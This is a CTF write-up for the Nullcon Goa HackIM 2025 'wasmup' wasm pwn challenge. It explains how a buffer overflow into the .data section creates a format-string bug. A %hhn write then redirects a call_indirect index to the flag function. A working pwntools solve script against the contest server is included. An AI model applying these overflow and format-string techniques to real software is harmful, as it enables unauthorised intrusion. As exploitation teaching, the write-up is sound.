---
title: "wasmup - Nullcon Goa HackIM 2025 CTF"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "buffer-overflow", "format-string", "pwndbg", "wasm", "wasmup", "stack", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "Use wabt to convert the given wasm fiel to readable wat."
source:
  name: "CTFtime writeup #39958"
  url: "https://ctftime.org/writeup/39958"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "wasmup"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** wasmup
- **Author team:** InfoSecIITR
- **CTFtime:** <https://ctftime.org/writeup/39958>

---
## Pwn / wasmup

Use [wabt](<https://github.com/WebAssembly/wabt>) to convert the given wasm fiel to readable wat. 

* In `__original_main` function there is a `call_indirect` instruction which is used to call functions from the function table   
```  
$wassup   
$wassflag   
$__stdio_seek   
$__stdio_write   
$__stdio_read   
$__stdio_close   
$__stdout_write  
```  
* THe `debug` function prints the address of the offsets used in `call_indirect` function   
* The goal was to overwrite the index of `wassup` (1 @ 0x11bac) to the index of `wassflag` (2)  
* There was also a buffer overflow which allowed to read directly into .data section and overwriting the `%s` argument of `printf` thus creating a format string vulnarability.   
* Using format string `%hhn` we can overwrite value at any given address 

#### Solve script

```python  
from pwn import *   
import time  
p = remote("52.59.124.14" ,5005)  
# p = process(["~/.wasmtime/bin/wasmtime", "wasmup.wasm"])  
x = 12  
p.sendlineafter(" you all alone?\n", cyclic(500 + 4*x) + p32(0x11bac))  
data = p.recv()  
print(data)  
# gdb.attach(p, '''  
# init-pwndbg  
# b *0x7ffff7bce5a0  
# ''')  
time.sleep(0.5)  
p.sendline((141+x) * "%p." + "a" + "%hhn" + "\x00")

time.sleep(0.5)  
p.sendline("anything")

p.interactive()  
```
